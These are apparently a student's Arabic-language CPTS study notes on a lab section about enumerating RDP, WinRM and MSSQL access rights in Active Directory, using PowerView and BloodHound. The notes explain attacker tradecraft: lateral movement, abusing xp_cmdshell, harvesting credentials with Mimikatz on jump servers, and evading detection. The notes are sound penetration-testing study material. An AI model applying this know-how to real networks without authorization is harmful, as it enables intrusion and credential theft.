---
title: "SEC-23: Lateral Movement — Privileged Access Rights"
module: "Active Directory Enumeration & Attacks"
section_num: 23
target: "INLANEFREIGHT.LOCAL"
tags:
  - CPTS
  - ActiveDirectory
  - LateralMovement
  - RDP
  - WinRM
  - MSSQL
difficulty: "Medium"
vectors: "RDP · WinRM / PSRemoting · SQLAdmin (xp_cmdshell)"
tools: "BloodHound · PowerView · Evil-WinRM · Impacket (mssqlclient) · PowerUpSQL"
status: "🟢 Complete"
date: 2026-08-03
---

> [!abstract] ⚙ T4E · التقنية للجميع · CPTS CERTIFICATION PATHWAY
> 
> |📍 TARGET NODE|🔐 ACCESS LEVEL|📡 ATTACK VECTOR|📋 SECTION ID|
> |:-:|:-:|:-:|:-:|
> |`10.129.85.172 — ACADEMY-EA-MS01`|`Authenticated Domain User`|`Remote Access Privilege Enumeration`|`SEC-23`|
> 
> |🛠️ KEY TOOLS|⚡ DIFFICULTY|🎯 CORE OBJECTIVE|📅 DATE|
> |:-:|:-:|:-:|:-:|
> |`BloodHound · PowerView · Evil-WinRM · mssqlclient`|`🟡 Medium`|`Enumerate & Abuse RDP, PSRemote, and SQLAdmin`|`2026-08-03`|

`PHASE_I: النظرية والتعداد (BloodHound/PowerView)` → `PHASE_II: الاستغلال (RDP / WinRM / MSSQL)` → `PHASE_III: رفع الصلاحيات والتحركات الأفقية`

```
╔══════════════════════════════════════════════════════════════════════╗
║                                                                      ║
║                      ████████╗██╗  ██╗███████╗                       ║
║                      ╚══██╔══╝██║  ██║██╔════╝                       ║
║                         ██║   ███████║█████╗                         ║
║                         ██║   ╚════██║██╔══╝                         ║
║                         ██║        ██║███████╗                       ║
║                         ╚═╝        ╚═╝╚══════╝                       ║
║                                                                      ║
║                       [ TECH FOR EVERYONE ]                          ║
║                                                                      ║
╠══════════════════════════════════════════════════════════════════════╣
║  [SYS]      :: NODE INITIALIZED — T4E NOTES v2.0                     ║
║  [SECTION]  :: SEC-21 // ACL Abuse — Kerberoasting via Fake SPN      ║
║  [DOMAIN]   :: INLANEFREIGHT.LOCAL · 10.129.84.16                    ║
║  [OPERATOR] :: Hexsein · Al-Nahrain University · CPTS Candidate      ║
║  [CLEARANCE]:: Level-3 // Penetration Testing Pathway                ║
╚══════════════════════════════════════════════════════════════════════╝
```

---

## ⚡ PHASE_I — النواة النظرية :: المفاهيم والبنية التحتية

> [!tip] 📡 PHASE I INITIALIZED · THEORETICAL CORE UPLOAD **Language:** Arabic — **Size:** ~2,000 Words **Content:** Deep conceptual framework · Infrastructure theory · Hacker mindset · Big picture.

---

تمام! استلمت نص السكشن، يا حسين. خلني أشرحلك إياه من الألف للياء:

🟢 Big Picture → 🔵 خريطة المفاهيم → 🟡 هيكل السكشن → 🟠 الشرح العميق → 🔴 ما لا يقوله السكشن → 💎 فلاشكاردز → 📄 ورقة غش السكشن

يله نبدأ... 🚀

━━━━━

### 🟢 المرحلة 0: Big Picture — ليش هذا الموضوع موجود أصلاً؟

تخيل وياي هذا السيناريو من الحياة الواقعية: أنت دخلت لبناية شركة ضخمة ومحصنة (هاي البناية هي الـ Active Directory أو شبكة الشركة). كدرت بطريقة معينة تبوك باج (ID Card) مال موظف استعلامات عادي، وعبرت الباب الرئيسي للشركة. هسة أنت داخل البناية (هذا نسميه Foothold أو موطئ قدم).

المشكلة وين؟ غرف السيرفرات، مكاتب المدراء، والخزنة الرئيسية كلها مقفولة. باج الاستعلامات اللي بيدك ما يفتح هذي الأبواب المهمة. هسة أنت كدام خيارين:

الأول: تكسر الأبواب بالقوة وتستخدم متفجرات (بالسايبر سكيورتي، هذا يمثل استخدام ثغرات Exploits مثل Zero-days، واللي راح يخلي أجهزة الإنذار والـ SOC تصرخ وتكشفك فوراً).

الثاني: تتمشى بهدوء بالبناية، وتدور بالأنظمة عن "منو يملك مفتاح الغرفة الفلانية؟" أو "هل هذا الباج اللي بيدي بالصدفة إله صلاحية يدخل لغرفة الـ IT لأن الموظف جان يشتغل هناك قبل؟".

هذا السكشن اللي دتقراه اسمه **Privileged Access** (الوصول بصلاحيات)، وهو يمثل الخيار الثاني. ليش هذا الموضوع موجود ومهم جداً؟ لأن في بيئات الـ Windows والـ Active Directory الحقيقية، المشكلة مو دائماً تكون بوجود "ثغرة برمجية" بالنظام. الخلل الجوهري يكون في **"سوء إدارة الصلاحيات" (Misconfigurations)**. مسؤولي النظام (System Admins) بالشركات الكبيرة يوزعون صلاحيات لمئات أو آلاف الموظفين على مدى سنين. ينسون يمسحون صلاحيات قديمة، أو يعطون مجموعة كاملة مثل "كل المستخدمين" (Domain Users) صلاحية الدخول عن بعد لجهاز معين بس علمود يسهلون شغلهم، وينسون الموضوع.

هنا يجي دورك كـ Penetration Tester (أو كطالب CPTS). النظام مصمم حتى يسمح للإدارة عن بعد باستخدام بروتوكولات شرعية مثل RDP أو PowerShell أو قواعد البيانات. هاي ميزات (Features) مو ثغرات (Bugs). أنت ما راح تهاجم النظام وتكسره، أنت راح **تستخدم النظام ضد نفسه**. راح تبحث عن هذي الصلاحيات المنسية أو الموزعة بشكل خاطئ حتى تنتقل من جهاز لجهاز (Lateral Movement) أو ترفع صلاحياتك (Vertical Movement) لحد ما توصل للـ Domain Admin.

**وين يظهر هذا بالواقع؟**

كل هجمات الـ APTs (عصابات الهاكرز المدعومة من دول) وعصابات الـ Ransomware (مثل LockBit و Conti) يعتمدون على هذا المبدأ اللي اسمه (Living off the Land). بدل ما يطورون فيروسات معقدة تنكشف من برامج الحماية، يستخدمون أدوات الويندوز نفسها (مثل RDP و WinRM) حتى يتحركون بالشبكة، لأن الـ Antivirus ما راح يمنع أداة هي أصلاً جزء من الويندوز!

**وين يقع هذا السكشن بخريطة CPTS؟**

هذا السكشن يجي مباشرة **بعد** ما تحصل أول اختراق (Post-Exploitation). أنت هسة جوه الشبكة، ومهمتك هي "الاستطلاع الداخلي" لمعرفة وين تكدر تروح باستخدام الحساب اللي اخترقته.

**شنو راح تكون قادر تسوي بعد هذا السكشن؟**

1. راح تعرف شلون تسأل الويندوز: "منو يكدر يدخل على هذا الجهاز عن بعد؟" بدون ما تثير الشبهات.
    
2. راح تستخدم أداة PowerView لاستخراج قوائم المستخدمين اللي عدهم صلاحيات RDP على أي سيرفر.
    
3. راح تفهم شلون تقرأ خريطة BloodHound حتى تشوف مسارات الاختراق بعينك وتعرف بالضبط يا مستخدم تحتاج تخترقه حتى توصل لهدفك.
    

━━━━━

### 🔵 المرحلة 1: خريطة المفاهيم

خلينا نفلتر السكشن وناخذ كل المصطلحات التقنية ونفهمها بالعراقي البسيط حتى من تقرأها بعدين ما تحسها طلاسم:

**1. Foothold (موطئ القدم)**

- **شنو يعني؟** أول اختراق تسويه بالشبكة. مثل ما تحط رجلك بالباب حتى ما ينسد. يعني حصلت أول يوزر، أو أول شيل (Shell) على جهاز بسيط بالشركة. من هنا تبدأ رحلتك الحقيقية.
    
- **وين يظهر؟** مصطلح عام بالـ Pentesting، يمثل نهاية مرحلة الـ Initial Access وبداية الـ Post-Exploitation.
    

**2. Lateral Movement (الحركة الجانبية)**

- **شنو يعني؟** الانتقال من جهاز لجهاز ثاني بالشبكة بنفس مستوى الصلاحيات. يعني أنت هكرت حاسبة موظف (أحمد)، ومن حاسبة أحمد كدرت تدخل لحاسبة موظف ثاني (محمود). أنت ما صرت مدير (Admin)، بس وسعت نطاق سيطرتك.
    
- **مثال:** استخدام باسورد أحمد حتى تفتح فولدرات مشتركة (SMB) بحاسبة محمود.
    

**3. Vertical Movement / Privilege Escalation (الحركة العمودية)**

- **شنو يعني؟** هذي هي الترقية! الانتقال من مستخدم عادي إلى مستخدم بصلاحيات أعلى (مثل Local Admin أو Domain Admin).
    
- **مثال:** تستغل ثغرة أو تلقى باسورد يخليك تتحول من يوزر عادي إلى Root أو Administrator.
    

**4. RDP (Remote Desktop Protocol)**

- **شنو يعني؟** بروتوكول سطح المكتب البعيد. هذا اختراع من مايكروسوفت يخليك تكنك على حاسبة ثانية وتشوف شاشتها وتتحكم بالماوس والكيبورد كأنك كاعد كدامها.
    
- **وين يظهر؟** يشتغل على بورت 3389 عادةً. إذا عندك يوزر وباسورد مسموح إله بالـ RDP، تكدر تدخل للحاسبة كواجهة رسومية (GUI).
    

**5. WinRM / PowerShell Remoting (PSRemote)**

- **شنو يعني؟** أداة الإدارة عن بعد الخاصة بالويندوز، بس بدون شاشة (مو مثل RDP). تعطيك شاشة سوداء (Command Line) تتحكم بيها بالجهاز الثاني عن طريق أوامر PowerShell. سريعة، خفيفة، ومفضلة جداً للمخترقين لأنها ما تطلع بوب-أب (Pop-up) بوجه المستخدم.
    
- **وين يظهر؟** تشتغل على بورتات 5985 (HTTP) و 5986 (HTTPS). أداة مثل `evil-winrm` تستخدم هذا البروتوكول.
    

**6. SMB (Server Message Block) / Pass-the-Hash**

- **شنو يعني؟** بروتوكول مشاركة الملفات بالويندوز. الـ Pass-the-Hash هي تقنية هجومية خرافية: إذا كدرت تسرق "الهاش" (الباسورد المشفر) مال مستخدم، ما يحتاج تفك تشفيره! الويندوز غبي كفاية إنه يقبل الهاش نفسه كإثبات هوية ويدخلك عبر الـ SMB.
    

**7. BloodHound Edges (CanRDP, CanPSRemote, SQLAdmin)**

- **شنو يعني؟** الـ BloodHound هو برنامج يرسم خريطة الشبكة مثل الفيسبوك. المستخدمين والأجهزة هم دوائر (Nodes). الخطوط اللي تربط بينهم تسمى Edges (حواف أو علاقات).
    
- **مثال:** إذا شفت خط مكتوب عليه `CanRDP` طالع من يوزر "حسين" ورايح لسيرفر "MS01"، يعني حسين يكدر يدخل ريموت ديسكتوب لهذا السيرفر.
    

**8. PowerView / Get-NetLocalGroupMember**

- **شنو يعني؟** PowerView هو سكريبت PowerShell مشهور جداً بعالم الاختراق. أداة استطلاع قوية تسأل الـ Active Directory أسئلة وتجيبلك الأجوبة. الأمر `Get-NetLocalGroupMember` تحديداً يسأل: "أعطيني قائمة بكل الأشخاص اللي موجودين بجروب معين على حاسبة معينة".
    

━━━━━

### 🟡 المرحلة 2: هيكل السكشن — شنو يعلّمك وكيف؟

**اسم السكشن:** Privileged Access (الوصول ذو الامتيازات / الصلاحيات). **الموديول:** هذا جزء من مسارات الـ Active Directory الاستطلاعية والهجومية (Lateral Movement).

🎯 **ماذا يريد هذا السكشن أن تتعلم؟**

بعد قراءة وفهم هذا السكشن، المفروض تكون قادر على:

1. التمييز بين طرق الاتصال عن بعد في بيئة الويندوز (RDP, WinRM, MSSQL).
    
2. استخدام أوامر `PowerView` لمعرفة من يمتلك صلاحية الدخول لجروب معين على سيرفر بعيد.
    
3. قراءة وتحليل بيانات `BloodHound` لاكتشاف مسارات الوصول المخفية (مثل وراثة الصلاحيات للـ Domain Users).
    

📐 **هيكل المحتوى (Section Blueprint):**

السكشن مبني بتسلسل منطقي جداً، يجاوب على سؤال: "أنا هسة داخل الشبكة، بس ما عندي صلاحيات أدمن، شلون أتحرك؟"

Plaintext

```
[المشكلة: الوصول بدون صلاحيات مسؤول محلي (Local Admin)]
       │
       ▼
[الحلول المتاحة: بروتوكولات الإدارة عن بعد]
(RDP للواجهة، WinRM للأوامر، MSSQL لقواعد البيانات)
       │
       ▼
[طريقة الاستطلاع 1: الاستطلاع اليدوي الموجه]
(استخدام PowerView للبحث داخل جروب محدد مثل Remote Desktop Users)
       │
       ▼
[طريقة الاستطلاع 2: الاستطلاع البصري الشامل]
(استخدام BloodHound لرؤية العلاقات الجاهزة وتحليلها)
       │
       ▼
[النتيجة: إيجاد مسار لاستغلال صلاحيات مبالغ فيها (Misconfigurations)]
```

🔗 **المتطلبات السابقة (شنو لازم تعرف قبل لا تبدي):**

- السكشن يفترض بيك تعرف شنو هو الـ Domain Users (مجموعة تضم كل مستخدمين الشركة أوتوماتيكياً).
    
- يفترض إنك تعرف تستخدم PowerShell على الأقل كأساسيات.
    
- يفترض بيك رفعت بيانات الشبكة مسبقاً (عن طريق SharpHound) حتى تشوفها بـ BloodHound.
    

🚪 **ما يُفتح بعده (وين راح تروح بعدين):** هذا السكشن هو التمهيد المباشر لعملية "التنفيذ". يعني بعد ما تكتشف إنك تكدر تسوي RDP، السكاشن القادمة راح تعلمك شلون تفتح أداة `xfreerdp` وتدخل فعلياً للحاسبة وتبدي تسرق ملفات أو تدور على باسوردات الأدمن المخزونة بالذاكرة.

⚠️ **ما يذكره السكشن ضمنياً (افتراضات مخفية):**

1. السكشن يفترض إنك كدرت تسوي Load لسكربت PowerView بالذاكرة مالتك بدون ما الـ Windows Defender يمسحه (وهذا بحد ذاته تحدي ببيئات العمل الحقيقية).
    
2. يفترض السكشن إن جدار الحماية (Firewall) بينك وبين الهدف `MS01` يسمح بمرور أوامر الاستطلاع (RPC ports).
    

━━━━━

### 🟠 المرحلة 3: الشرح العميق

هنا راح نفلش السكشن قطعة قطعة، ونفهم ليش كل شي ديصير.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🔷 **المفهوم الأول: بروتوكولات الحركة الجانبية (The "How" of Lateral Movement)**

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

💡 **بالعراقي البسيط:** إذا أنت ما عندك باسورد "المدير" مال حاسبة معينة، هذا مو معناه ما تكدر تدخللها. نظام الويندوز بي أبواب خلفية شرعية مسويتها مايكروسوفت علمود موظفين الـ IT يشتغلون عن بعد. إذا إجيت أنت وأخذت حساب موظف IT، تكدر تستخدم نفس أبوابهم. هذي الأبواب هي RDP (لشاشة كاملة)، WinRM (لشاشة أوامر سوداء)، و MSSQL (للدخول على سيرفرات قواعد البيانات).

🎭 **التشبيه:**

اعتبر سيرفرات الشركة هي بيوت.

- الـ **RDP** مثل ما واحد يعطيك نسخة من مفتاح بيته، تدخل وتكعد بالصالة وتتفرج تلفزيون (وصول كامل لكل شي وتشوفه بعينك).
    
- الـ **WinRM (PSRemoting)** مثل ما واحد يخليك تتصل بجهاز الانتركم (Intercom) مال بيته. أنت ما تكدر تدخل وتشوف بعينك، بس تكدر تحجي وتطي أوامر: "افتح الباب، شغل الضوة" (Command-line access).
    
- الـ **MSSQL** مثل ما عندك مفتاح فقط للمخزن مال البيت (Database). بس مرات، من المخزن تكدر تحفر حفرة وتفوت للبيت كله! (عبر استغلال خصائص معينة بقواعد البيانات لتشغيل أوامر نظام).
    

🔬 **ليش يعمل هيج؟ (المبدأ الجوهري):** الويندوز يعتمد على شي اسمه Access Control Lists (ACLs). كل خدمة (Service) بالويندوز عدها لستة حراس. حارس الـ RDP يختلف عن حارس الـ WinRM. إذا أنت يوزر عادي، بس الـ Admin حط اسمك بلستة حراس الـ RDP لحاسبة معينة، الويندوز راح يفتحلك شاشة واجهة رسومية بدون ما يسألك "أنت أدمن لو لا؟". هو ينفذ الأوامر المكتوبة باللستة حرفياً وبغباء شديد.

Plaintext

```
Lateral Movement Flow:
[Attacker with Foothold] 
           │
           ├─(Credentials/Hash)─► Port 3389 (RDP) ──► GUI Access
           │
           ├─(Credentials/Hash)─► Port 5985 (WinRM) ──► PowerShell Shell
           │
           └─(Credentials/Hash)─► Port 1433 (MSSQL) ──► Database Access ──► xp_cmdshell ──► System Shell
```

❓ **الـ "بس ليش؟" — أسئلة شائعة:**

- **س: ليش ما أستخدم ثغرة (Exploit) وخلاص بدل ما أدور على صلاحيات RDP؟**
    
    - ج: لأن الثغرات نادرة بالأنظمة المحدثة، واستخدامها يسبب Crash للنظام أحياناً ويدق أجراس الإنذار. الدخول بـ RDP باستخدام باسورد صحيح هو عبارة عن "تسجيل دخول شرعي"، محد راح يشك بيك.
        

⏸️ **نقطة توقف:** فهمنا هسة إن هدفنا مو ندمر الأبواب، هدفنا نلقى الحسابات اللي عدها مفاتيح شرعية لهذي الأبواب.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🔷 **المفهوم الثاني: استطلاع جروب الـ RDP باستخدام PowerView**

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

💡 **بالعراقي البسيط:** هسة إحنا نريد نسأل سؤال محدد: جهاز السيرفر اللي اسمه `MS01`.. منو الأشخاص اللي مسموحلهم يدخلون إله عن طريق الـ RDP؟ بالويندوز، اكو جروب (مجموعة) جاهز اسمه `Remote Desktop Users`، أي شخص ينحط بهذا الجروب، يكدر يسوي RDP. هنا راح نستخدم سكريبت PowerView ونجيب أمر `Get-NetLocalGroupMember` حتى يسحب النا كل الأسماء الموجودة بهذا الجروب من السيرفر البعيد عن طريق الشبكة.

🔧 **الأمر / الأداة:**

PowerShell

```
Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Desktop Users"
```

💬 **شرح الـ flags:**

- `Get-NetLocalGroupMember`: هذا اسم الأمر (الدالة) داخل سكربت PowerView. وظيفتها تجيب أعضاء جروب محلي (Local Group) مو جروب عام بالدومين.
    
- `-ComputerName`: هنا نحدد اسم الجهاز الهدف اللي نريد نستجوبه (بهذه الحالة `ACADEMY-EA-MS01`).
    
- `-GroupName`: اسم الجروب اللي نريد نسحب أعضاءه. حددنا `"Remote Desktop Users"` (بين علامات تنصيص لأن بيه مسافات).
    

📤 **الـ Output المتوقع:**

Plaintext

```
ComputerName : ACADEMY-EA-MS01
GroupName    : Remote Desktop Users
MemberName   : INLANEFREIGHT\Domain Users
SID          : S-1-5-21-3842939050-3880317879-2865463114-513
IsGroup      : True
IsDomain     : UNKNOWN
```

🔍 **كيف تقرأ الـ Output؟ (هنا زبدة الاختراق):**

الـ Output طلعنا معلومة ذهبية (وخطيرة جداً أمنياً):

1. **MemberName:** يكولك العضو اللي عنده حق الـ RDP هو `INLANEFREIGHT\Domain Users`. شنو يعني هذا؟ `Domain Users` هو جروب افتراضي يضم **كــــــــــل** مستخدمين الشركة بدون استثناء! يعني حرفياً منظف الأرضيات اللي عنده إيميل بالشركة، يكدر يسوي RDP على هذا السيرفر!
    
2. **SID:** (Security Identifier) هو رقم الهوية الوطني مال هذا الجروب بويندوز. أي SID ينتهي برقم `-513` هو دائماً وبكل شبكات العالم يمثل `Domain Users`.
    
3. **IsGroup : True:** يأكدلك إن اللي عنده الصلاحية هو مو شخص واحد، بل جروب كامل.
    

❓ **الـ "بس ليش؟" — أسئلة شائعة:**

- **س: ليش مكتوب `IsDomain : UNKNOWN`؟ هل اكو خطأ؟**
    
    - ج: لا، مو خطأ. أداة PowerView تعتمد على تقنيات معينة لتحويل الـ SID إلى اسم. مرات الأداة وهي تشتغل من حاسبتك ما تكدر تتأكد 100% إذا هذا الجروب تابع للدومين لو محلي، فتكتب UNKNOWN. المهم إنك كبشر شفت اسم `INLANEFREIGHT\` فعرفت فوراً إنه تابع للدومين.
        
- **س: ليش أصلاً الـ Admin يسوي هيج غباء ويخلي كل الناس تدخل RDP لسيرفر؟**
    
    - ج: مرات السيرفر يكون (Jump Host) أو (RDS - Remote Desktop Services) مخصص علمود الموظفين يفتحون منه برامج الشركة من بيوتهم. الآدمن يسترخص جهده ويقول "خلي أضيف كل الدومين يوزرز حتى أخلص من وجع الرأس". وهذا هو الـ Misconfiguration اللي إحنا ندور عليه!
        

⏸️ **نقطة توقف:** باستخدام سطر برمجي واحد، اكتشفنا إن الحساب العادي اللي بأيدنا يكدر يفتح واجهة رسومية (RDP) على سيرفر بالشبكة.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🔷 **المفهوم الثالث: الرؤية الشاملة باستخدام BloodHound**

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

💡 **بالعراقي البسيط:** استخدام PowerView حلو، بس بطيء. تخيل عندك 5000 سيرفر بالشركة، هل راح تكتب الأمر 5000 مرة؟ لا. هنا يجي أسطورة الـ Active Directory اللي هو **BloodHound**. هذي أداة تسحب كل بيانات الشبكة مسبقاً، وترسمها على شكل خريطة. بدل ما تسأل بالسيرفر الواحد، تروح للواجهة وتدوس كليك، وتشوف بعينك مسارات اختراق جاهزة.

🎭 **التشبيه:**

PowerView هو مثل ما تمشي بالشارع وتسأل حارس كل عمارة: "أخوية، تسمحلي أفوت؟".

BloodHound هو مثل ما تصعد بطيارة درون، وعندك خريطة Google Maps ملونة توضحلك كل الأبواب المفتوحة بالمدينة كلها بضغطة زر.

🔬 **ليش يعمل هيج؟ (المبدأ الجوهري):** BloodHound يعتمد على نظرية المخططات (Graph Theory). ياخذ آلاف البيانات المعقدة (منو بيا جروب، ويا جروب عنده صلاحية على يا جهاز) ويحولها لخطوط (Edges). بالسكشن، ذكرلك إنك تكدر تروح لتبويب الـ **Node Info** (معلومات العقدة/المستخدم) وتدور على قسم **Execution Rights** (صلاحيات التنفيذ). هناك راح تشوف بعينك أنواع الوصول:

- **CanRDP:** يكدر يدخل ريموت ديسكتوب.
    
- **CanPSRemote:** يكدر يدخل PowerShell.
    
- **SQLAdmin:** يكدر يتحكم بقاعدة البيانات.
    

🔍 **كيف تقرأ واجهة BloodHound (المرفقة بالصور):**

1. بالصورة الأولى `image_651520.png`: لمّا ضغطنا على مجموعة `DOMAIN USERS`، رحنا لقسم `Execution Rights`، شفنا رقم `1` كدام `First Degree RDP Privileges`. هذا يعني إن المجموعة تمتلك حق الدخول كـ RDP على سيرفر واحد بشكل "مباشر" (First Degree يعني الصلاحية ممنوحة إلهم شخصياً، مو وارثيها من جروب ثاني).
    
2. بالرسم البياني (Graph): تشوف دائرة صفراء (المجموعة) طالع منها سهم مكتوب عليه `CanRDP` باتجاه شاشة حمراء (السيرفر `ACADEMY-EA-MS01`).
    
3. بالصورة الثانية `image_651507.png`: لو بحثنا عن مستخدم اسمه `WLEY`، راح نلقى بخانة الـ Execution Rights إن الـ `First Degree` هو `0`، بس الـ `Group Delegated RDP Privileges` هو `1`. _شنو يعني Group Delegated؟_ يعني المستخدم `WLEY` ما انطوه صلاحية الـ RDP باسمه الشخصي. لكنه هو عضو بجروب `Domain Users`، والجروب عنده الصلاحية! بالتالي هو "ورث" الصلاحية. هذا هو سحر BloodHound، يكشفلك الصلاحيات المتوارثة اللي الآدمن نفسه ينساها.
    

❓ **الـ "بس ليش؟" — أسئلة شائعة:**

- **س: الأداة بها queries (استعلامات) جاهزة مثل `Find Workstations where Domain Users can RDP`، ليش ما نستخدمها دائماً ونرتاح؟**
    
    - ج: صحيح تكدر تستخدمها وهي ممتازة للبحث السريع (وهذا مذكور بالسكشن في تبويب Analysis). بس بالـ Pentest الاحترافي، مرات تحتاج تسوي Custom Queries لأن البيئة معقدة والاستعلامات الجاهزة ما تغطي احتياجك الدقيق.
        

⏸️ **نقطة توقف:** BloodHound يوفر علينا وقت هائل، ويعطينا رؤية للمسارات المتوارثة (التي نالها المستخدم عن طريق انتماءه لمجموعات أخرى) والتي تصعب رؤيتها يدوياً.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

📊 **ملخص ما تعلمنا بالمرحلة ٣:**

|**المفهوم / الأداة**|**ما تعنيه (الزبدة)**|**متى تستخدمه**|
|---|---|---|
|**RDP / WinRM / MSSQL**|طرق دخول عن بعد شرعية يوفرها الويندوز.|للتحرك أفقياً أو عمودياً داخل الشبكة بعد الحصول على موطئ قدم.|
|**PowerView** (`Get-NetLocalGroupMember`)|سكريبت يسحب أعضاء المجموعات المحلية من الأجهزة البعيدة.|للتحقق المباشر من جهاز معين لترى من يملك صلاحية عليه.|
|**BloodHound** (`Execution Rights`)|أداة بصرية تحلل وتربط الصلاحيات المعقدة والمتوارثة بضغطة زر.|للعثور على مسارات الهجوم بسرعة عالية ورؤية ما خفي بسبب توريث الجروبات.|

━━━━━

### 🔴 المرحلة 4: ما لا يقوله السكشن

هنا يجي دور الخبرة الواقعية. HTB يعلمك إن الأوامر تشتغل 100%، بس بالواقع الميداني، اكو أشياء راح تعذبك لازم تعرفها هسة:

🕳️ **الثغرات في شرح السكشن:**

1. **السكشن ما ذكر إن PowerView يترك أثراً كبيراً:** استخدام `Get-NetLocalGroupMember` يعتمد على بروتوكولات مثل SAMR و RPC للاتصال بالسيرفر البعيد وسحب البيانات. بالشركات اللي عدها أنظمة مراقبة قوية (SOC / EDR)، هذا النوع من الـ Traffic الداخلي الكثيف (استجواب كل الأجهزة بالشبكة) يعتبر مؤشر خطر عالي (Noisy) وممكن يحرك عليك الـ Blue Team فوراً.
    
2. **السكشن ما وضح مشكلة الجدار الناري (Firewall):** السكشن يفترض إنك تكتب الأمر وتطلع النتيجة. بالواقع، الويندوز ديفيندر والـ Windows Firewall افتراضياً يمنعون استعلامات الـ RPC من خارج الجهاز. إذا جربت الأمر وطلعلك `Access Denied` أو `RPC Server is Unavailable`، هذا مو معناه ما عندك صلاحية، معناه الفايرول دا يصدك.
    

⚠️ **الـ Gotchas (الفخوخ) عند تطبيق هذا بالـ Lab أو الـ Exam:**

1. **BloodHound بياناته قد تكون قديمة (Stale Data):** من تشتغل ببيئة حقيقية أو لاب معقد، دير بالك تعتمد 100% على بلودهوند بدون تحقق. يجوز البيانات انجمعت לפני أسبوع، والآدمن مسح اليوزر من الجروب. دائماً استخدم BloodHound **للتوجيه**، واستخدم PowerView أو أوامر الويندوز **للتأكيد المباشر** قبل لا تنفذ هجومك.
    
2. **"Domain Users" ليسوا دائماً موجودين:** باللاب الخاص بهذا السكشن، خلّوا `Domain Users` بجروب الـ RDP حتى يوضحون الفكرة. بالـ CPTS Exam، غالباً ما راح تكون بهالسهولة. راح تلقى يوزر عادي (مثل Helpdesk) هو اللي عنده الصلاحية، ولازم تخترق هذا اليوزر أولاً حتى تستخدم الـ RDP.
    

🌍 **السياق الحقيقي (Real Pentest Context):** ليش يوزر الـ RDP العادي مهم كلش؟ بالـ Pentest، إذا دخلت RDP لسيرفر يستخدم من قبل موظفين كثيرين (مثل Jump Server)، تكدر تستخدم أداة مثل `Task Manager` أو `Mimikatz` (إذا لقيت طريقة ترفع صلاحياتك محلياً) حتى تسرق الباسوردات مال كل الموظفين الثانيين اللي مسجلين دخول على نفس هذا السيرفر! يعني سيرفر الـ RDP هو عبارة عن "مصيدة باسوردات" للمخترق.

🏆 **النصيحة الذهبية للـ CPTS Exam:** بالامتحان، أول ما تحصل أي يوزر عادي بالدومين وتمشي BloodHound (SharpHound)، عوف كلشي من ايدك وروح لتبويب **Analysis** واضغط على الـ Queries الجاهزة الخاصة بالـ **Execution Rights**. دور إذا هذا اليوزر (أو أي جروب هو ينتمي إله) يكدر يسوي RDP أو WinRM على أي حاسبة ثانية. 90% من مسارات الاختراق بالامتحانات تبدأ من صلاحية وصول منسية مو من ثغرة معقدة. لا تضيع وقتك تدور على Exploits قبل لا تشيك هذي الصلاحيات.

━━━━━

### 💎 الفلاشكاردز — ملخص السكشن للحفظ

هاي ٧ بطاقات مهمة جداً خليها ببرنامج Anki أو راجعها قبل اللاب:

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🔹 Card #1

❓ Front: ما هو الهدف الرئيسي من البحث عن صلاحيات مثل RDP أو WinRM في الـ Active Directory؟

✅ Back: للقيام بحركة جانبية (Lateral Movement) بطريقة شرعية لا تعتمد على استغلال ثغرات (Exploits)، بل تعتمد على إعدادات خاطئة (Misconfigurations).

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🔹 Card #2

❓ Front: في واجهة BloodHound، تحت أي قسم نبحث عن صلاحيات الدخول عن بعد (Remote Access)؟

✅ Back: تحت قسم Execution Rights في تبويب Node Info.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🔹 Card #3

❓ Front: ما الفرق بين First Degree RDP و Group Delegated RDP في BloodHound؟

✅ Back: First Degree يعني أن المستخدم أُعطي الصلاحية بشكل مباشر وباسمه. Delegated يعني أنه يمتلك الصلاحية لأنه عضو في مجموعة (Group) تمتلك هذه الصلاحية.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🔹 Card #4

❓ Front: ما هو الأمر في PowerView المستخدم لمعرفة أعضاء مجموعة معينة على سيرفر بعيد؟

✅ Back: `Get-NetLocalGroupMember -ComputerName <Name> -GroupName "<Group>"`

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🔹 Card #5

❓ Front: إذا أظهر لك PowerView أن العضو يمتلك SID ينتهي بـ -513، ماذا يعني ذلك عادةً؟

✅ Back: يعني أنه مجموعة "Domain Users"، مما يعني أن جميع مستخدمي الدومين لديهم هذه الصلاحية.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🔹 Card #6

❓ Front: ماذا تعني العلاقة (Edge) التي تسمى CanPSRemote في BloodHound؟

✅ Back: تعني أن المستخدم أو المجموعة قادرة على فتح جلسة أوامر عن بعد (PowerShell Remoting / WinRM) على الجهاز المستهدف.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🔹 Card #7

❓ Front: هل وجود صلاحية RDP لمستخدم عادي يعني أنه Local Admin بالضرورة؟

✅ Back: لا، الويندوز يتيح إعطاء حق الـ RDP لمستخدمين عاديين بدون منحهم صلاحيات إدارية على النظام.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

━━━━━

### 📄 ورقة غش السكشن — للسكرين شوت

🛑 هذه الورقة مخصصة بس لهذا السكشن (Lateral Movement Enumeration). اقرأها قبل لا تبدي اللاب الخاص بهذا السكشن.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

📄 ورقة غش: Privileged Access Enumeration

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🎯 **هدف هذا السكشن بجملة:**

التحقق إذا كان الحساب اللي تمتلكه (أو حسابات أخرى) يكدر يدخل ريموت لأجهزة بالشبكة عبر RDP، WinRM، أو SQL.

⚔️ **خوارزمية التطبيق (شلون تفكر باللاب):**

1. حصلت يوزر وباسورد؟ ممتاز.
    
